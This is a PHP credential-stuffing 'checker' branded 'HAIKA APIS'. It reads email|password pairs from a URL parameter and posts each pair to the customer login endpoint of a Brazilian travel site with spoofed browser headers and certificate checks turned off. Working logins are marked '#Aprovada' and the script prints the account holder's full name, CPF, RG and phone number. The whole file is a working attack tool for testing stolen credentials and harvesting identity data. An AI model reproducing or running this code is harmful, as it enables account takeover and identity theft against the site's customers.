<?php

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 888    888        d8888 8888888 888    d8P         d8888            d8888 8888888b.  8888888  .d8888b.  //
// 888    888       d88888   888   888   d8P         d88888           d88888 888   Y88b   888   d88P  Y88b //
// 888    888      d88P888   888   888  d8P         d88P888          d88P888 888    888   888   Y88b.      //
// 8888888888     d88P 888   888   888d88K         d88P 888         d88P 888 888   d88P   888    "Y888b.   //
// 888    888    d88P  888   888   8888888b       d88P  888        d88P  888 8888888P"    888       "Y88b. //
// 888    888   d88P   888   888   888  Y88b     d88P   888       d88P   888 888          888         "888 //
// 888    888  d8888888888   888   888   Y88b   d8888888888      d8888888888 888          888   Y88b  d88P //
// 888    888 d88P     888 8888888 888    Y88b d88P     888     d88P     888 888        8888888  "Y8888P"  //
//////////////////////////////////////////////////////////////////////////////////////////////////////////////

error_reporting(0);

function puxarbyhaika($string, $start, $end) {
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}

function multiexplode($string) {
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$time = time();

$haikazz = curl_init();
curl_setopt_array($haikazz, [
CURLOPT_URL => "https://www.havanviagens.com.br/Cliente/LoginCliente",
CURLOPT_RETURNTRANSFER  => true,
CURLOPT_SSL_VERIFYPEER  => false,
CURLOPT_HTTPHEADER  => array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://www.havanviagens.com.br',
'referer: https://www.havanviagens.com.br/Cliente/Login?tipoDeConteudo=14',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
'x-requested-with: XMLHttpRequest'),
CURLOPT_POSTFIELDS => 'login='.$email.'&senha='.$senha.'',
]);
$Haika = curl_exec($haikazz);
$decode = json_decode($Haika, true);
$json = json_decode($Haika, true)['Cliente'];
$nome = $json['NomeCompleto'];
$sexo = $json['Sexo'];
$cpf = $json['CPF'];
$rg = $json['RG'];
$endereco_valido = $json['LocalizacaoValida'];
$telefone = $json['Telefone'];

if(stripos($Haika, 'NomeCompleto')){
    echo '<span class="badge badge-success">#Aprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ Login Efetuado Com Sucesso! ] | </span> <span class="badge badge-info">NOME:</span> '.$nome.' | <span class="badge badge-info">CPF:</span> '.$cpf.'</span> | <span class="badge badge-info">TELEFONE:</span> '.$telefone.' | <span class="badge badge-info">RG:</span> '.$rg.' | Tempo De Resposta: '.(time() - $time).' | <span class="badge badge-light">@Haika.php</span></br>';   
}
else{
echo '<br><span class="badge badge-danger">Reprovada</span> '.$email.'|'.$senha.' | <span class="badge badge-info">Retorno:</span> [ Conta Não Encontrada! ] | Tempo De Resposta: '.(time() - $time).' | <span class="badge badge-light">@Haika.php</span></br>';
}

?>